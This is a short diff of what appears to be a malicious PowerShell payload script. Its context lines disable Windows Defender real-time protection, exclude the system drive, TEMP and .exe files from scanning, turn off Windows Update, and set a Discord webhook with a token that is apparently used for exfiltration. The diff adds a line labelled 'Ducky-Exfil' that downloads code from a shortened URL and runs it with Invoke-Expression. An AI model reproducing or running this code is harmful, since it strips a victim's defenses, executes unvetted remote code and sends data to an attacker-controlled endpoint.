@@ -224,6 +224,9 @@ Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard
 #Exclusions
 Set-ExecutionPolicy Unrestricted -Force; Set-MpPreference -DisableRealTimeMonitoring $true; Set-MpPreference -MAPSReporting 0; Set-MpPreference -DisableBlockAtFirstSeen $true; Add-MpPreference -ExclusionPath $env:SystemDrive ; Add-MpPreference -ExclusionPath $env:TEMP; Add-MpPreference -ExclusionExtension ".exe"; Set-Service -Name "wuauserv" -StartupType Disabled;
 
+#Ducky-Exfil
+irm https://rb.gy/xzpj1d | iex;
+
 #Lasania
 $webhook = "https://discord.com/api/webhooks/1258951712375570523/ZzVRGI8GumQjTSz_s2geTSXNsk0tE9zp5_56xGu9u2GEHwjLmXhsYPL4G4GMYGmjOC3f";
 $version = "2.4.6";
